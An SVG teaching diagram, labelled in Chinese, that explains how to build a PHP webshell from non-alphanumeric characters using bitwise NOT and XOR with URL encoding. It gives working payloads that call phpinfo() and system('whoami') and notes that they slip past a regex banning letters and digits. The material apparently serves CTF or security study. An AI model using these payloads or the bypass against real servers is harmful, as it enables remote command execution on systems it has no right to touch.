<svg xmlns="http://www.w3.org/2000/svg" width="940" height="600" viewBox="0 0 940 600" font-family="'Microsoft YaHei','PingFang SC',sans-serif">
  <defs>
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
      <path d="M0,0 L0,6 L9,3 z" fill="#4b5563"/>
    </marker>
  </defs>

  <rect width="940" height="600" fill="#fafafa"/>

  <text x="470" y="36" text-anchor="middle" font-size="20" font-weight="bold" fill="#111827">无数字字母 WebShell 构造步骤（取反 / 异或）</text>
  <text x="470" y="58" text-anchor="middle" font-size="12.5" fill="#6b7280">核心：用位运算把「函数名字符串」降级成一串非字母数字的字节，再用 URL 编码搬过去</text>

  <!-- ===== left flow ===== -->
  <rect x="36" y="92" width="360" height="72" rx="8" fill="#dbeafe" stroke="#3b82f6" stroke-width="1.6"/>
  <text x="56" y="120" font-size="13.5" font-weight="bold" fill="#1e3a8a">① 确定目标</text>
  <text x="56" y="142" font-size="11.5" fill="#1e40af">要调用的函数名，如 phpinfo、system whoami</text>

  <path d="M216,164 L216,180" stroke="#4b5563" stroke-width="1.6" marker-end="url(#arrow)"/>

  <rect x="36" y="182" width="360" height="72" rx="8" fill="#e0e7ff" stroke="#6366f1" stroke-width="1.6"/>
  <text x="56" y="210" font-size="13.5" font-weight="bold" fill="#312e81">② 逐字节取反 ~</text>
  <text x="56" y="232" font-size="11.5" fill="#3730a3">顺序无关，逐字节运算：'p'=0x70 → ~ = 0x8F</text>

  <path d="M216,254 L216,270" stroke="#4b5563" stroke-width="1.6" marker-end="url(#arrow)"/>

  <rect x="36" y="272" width="360" height="72" rx="8" fill="#fef3c7" stroke="#f59e0b" stroke-width="1.6"/>
  <text x="56" y="300" font-size="13.5" font-weight="bold" fill="#78350f">③ URL 编码</text>
  <text x="56" y="322" font-size="11.5" fill="#92400e">0x8F → 写作 %8F，传输层只出现 % 与十六进制</text>

  <path d="M216,344 L216,360" stroke="#4b5563" stroke-width="1.6" marker-end="url(#arrow)"/>

  <rect x="36" y="362" width="360" height="72" rx="8" fill="#dcfce7" stroke="#22c55e" stroke-width="1.6"/>
  <text x="56" y="390" font-size="13.5" font-weight="bold" fill="#14532d">④ 服务端解码后取反</text>
  <text x="56" y="412" font-size="11.5" fill="#166534">URL 解码 → 原始字节；PHP 执行 ~ 运算还原字符</text>

  <path d="M216,434 L216,450" stroke="#4b5563" stroke-width="1.6" marker-end="url(#arrow)"/>

  <rect x="36" y="452" width="360" height="72" rx="8" fill="#fce7f3" stroke="#ec4899" stroke-width="1.6"/>
  <text x="56" y="480" font-size="13.5" font-weight="bold" fill="#831843">⑤ 加括号调用</text>
  <text x="56" y="502" font-size="11.5" fill="#9d174d">(取反结果)() → 等价于 phpinfo()，正式执行</text>

  <!-- ===== right panel: 取反 ===== -->
  <rect x="424" y="92" width="486" height="196" rx="8" fill="#f0fdf4" stroke="#22c55e" stroke-width="1.6"/>
  <text x="444" y="118" font-size="14" font-weight="bold" fill="#14532d">取反构造 (~)：每一位都取补</text>
  <text x="444" y="146" font-size="12" font-family="'Consolas','Courier New',monospace" fill="#166534">(~%8F%97%8F%96%91%99%90)();</text>
  <text x="700" y="146" font-size="11.5" fill="#6b7280">→ phpinfo()</text>
  <text x="444" y="176" font-size="12" font-family="'Consolas','Courier New',monospace" fill="#166534">(~%8C%86%8C%8B%9A%92)</text>
  <text x="444" y="196" font-size="12" font-family="'Consolas','Courier New',monospace" fill="#166534">( ~%88%97%90%9E%92%96 );</text>
  <text x="444" y="222" font-size="11.5" fill="#166534">→ system("whoami")</text>
  <line x1="444" y1="240" x2="890" y2="240" stroke="#bbf7d0" stroke-width="1"/>
  <text x="444" y="262" font-size="11.5" fill="#6b7280">解码后交给 PHP 的原始字节全部位于 0x80–0xFF 区间，不含任何字母数字</text>
  <text x="444" y="280" font-size="11.5" fill="#6b7280">生成脚本：对目标串逐字符取 ~ 后输出 %XX 即可</text>

  <!-- ===== right panel: 异或 ===== -->
  <rect x="424" y="308" width="486" height="216" rx="8" fill="#eff6ff" stroke="#3b82f6" stroke-width="1.6"/>
  <text x="444" y="334" font-size="14" font-weight="bold" fill="#1e3a8a">异或构造 (^)：两串夹逼</text>
  <text x="444" y="362" font-size="12" font-family="'Consolas','Courier New',monospace" fill="#1e40af">('+(+).&amp;/' ^ '[@[@@@@')();</text>
  <text x="444" y="382" font-size="11.5" fill="#6b7280">→ phpinfo()</text>
  <text x="444" y="410" font-size="12" font-family="'Consolas','Courier New',monospace" fill="#1e40af">(('("()%-'^'[[[]@@')</text>
  <text x="444" y="430" font-size="12" font-family="'Consolas','Courier New',monospace" fill="#1e40af">  (('((/!-)'^'_@@@@@')));</text>
  <text x="444" y="452" font-size="11.5" fill="#6b7280">→ system("whoami")</text>
  <line x1="444" y1="470" x2="890" y2="470" stroke="#bfdbfe" stroke-width="1"/>
  <text x="444" y="492" font-size="11.5" fill="#6b7280">原理：找出两组非字母数字字符，使对应位异或的结果恰好等于目标字母</text>
  <text x="444" y="510" font-size="11.5" fill="#6b7280">局限：任意字符不一定都能拆出合规的两字符，故异或的覆盖面不如取反</text>

  <!-- bottom note -->
  <rect x="36" y="548" width="874" height="36" rx="8" fill="#fff7ed" stroke="#f59e0b" stroke-width="1.4"/>
  <text x="56" y="571" font-size="11.5" fill="#78350f">校验发生在 PHP 源码层（URL 解码之后）—— 此时字符串里只剩运算符与高位字节，因此能通过「禁止字母数字」的正则</text>
</svg>
